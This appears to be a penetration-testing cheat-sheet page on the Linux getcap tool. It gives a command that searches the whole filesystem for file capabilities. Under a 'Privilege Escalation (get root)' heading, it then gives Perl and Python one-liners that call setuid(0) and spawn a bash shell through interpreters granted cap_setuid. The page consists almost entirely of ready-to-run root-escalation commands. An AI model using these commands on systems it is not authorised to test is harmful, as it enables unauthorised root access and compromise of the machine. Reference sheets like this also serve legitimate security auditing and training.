---
title: Getcap
desc: Displays the capabilities on the queried files.
tags: [Linux, PrivEsc]
alts: [Find, Setcap]
website:
---

## Basic

```sh
getcap -r / 2>/dev/null
```

<br />

## Privilege Escalation (get 'root')

```sh
# Perl (ex. /usr/bin/perl = cap_setuid+ep)
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# Python (ex. /usr/bin/python = cap_setuid+ep)
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```